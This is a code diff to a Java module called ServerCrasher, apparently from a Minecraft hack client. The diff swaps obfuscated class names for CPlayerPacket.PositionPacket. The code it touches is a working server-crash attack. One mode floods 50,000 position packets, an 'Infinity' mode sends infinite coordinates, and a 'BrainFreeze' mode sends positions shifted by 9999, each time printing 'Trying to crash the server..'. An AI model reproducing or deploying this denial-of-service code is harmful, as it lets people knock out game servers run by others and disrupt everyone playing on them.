@@ -5,9 +5,11 @@ import com.mentalfrostbyte.jello.event.impl.TickEvent;
 import com.mentalfrostbyte.jello.module.ModuleCategory;
 import com.mentalfrostbyte.jello.module.PremiumModule;
 import mapped.*;
+import net.minecraft.item.ItemStack;
 import net.minecraft.nbt.CompoundNBT;
 import net.minecraft.network.play.client.CAnimateHandPacket;
 import net.minecraft.network.play.client.CCreativeInventoryActionPacket;
+import net.minecraft.network.play.client.CPlayerPacket;
 import net.minecraft.util.Hand;
 
 public class ServerCrasher extends PremiumModule {
@@ -40,7 +42,7 @@ public class ServerCrasher extends PremiumModule {
 
                         for (int var26 = 0; var26 < 50000; var26++) {
                             var14 = var26 * 7;
-                            mc.getConnection().sendPacket(new Class5605(var6 - var14, var8 + var12, var10 + var14, false));
+                            mc.getConnection().sendPacket(new CPlayerPacket.PositionPacket(var6 - var14, var8 + var12, var10 + var14, false));
                         }
 
                         Class8906.method32487("Trying to crash the server..");
@@ -89,14 +91,14 @@ public class ServerCrasher extends PremiumModule {
                         this.method16000();
                         break;
                     case "Infinity":
-                        mc.getConnection().sendPacket(new Class5605(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
+                        mc.getConnection().sendPacket(new CPlayerPacket.PositionPacket(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
                         Class8906.method32487("Trying to crash the server..");
                         this.method16000();
                         break;
                     case "BrainFreeze":
                         mc.getConnection()
                                 .sendPacket(
-                                        new Class5605(
+                                        new CPlayerPacket.PositionPacket(
                                                 mc.player.getPosX() + 9999.0,
                                                 mc.player.getPosY() + 9999.0,
                                                 mc.player.getPosZ() + 9999.0,
@@ -105,7 +107,7 @@ public class ServerCrasher extends PremiumModule {
                                 );
                         mc.getConnection()
                                 .sendPacket(
-                                        new Class5605(
+                                        new CPlayerPacket.PositionPacket(
                                                 mc.player.getPosX(),
                                                 mc.player.getBoundingBox().field28450,
                                                 mc.player.getPosZ() + 9999.0,
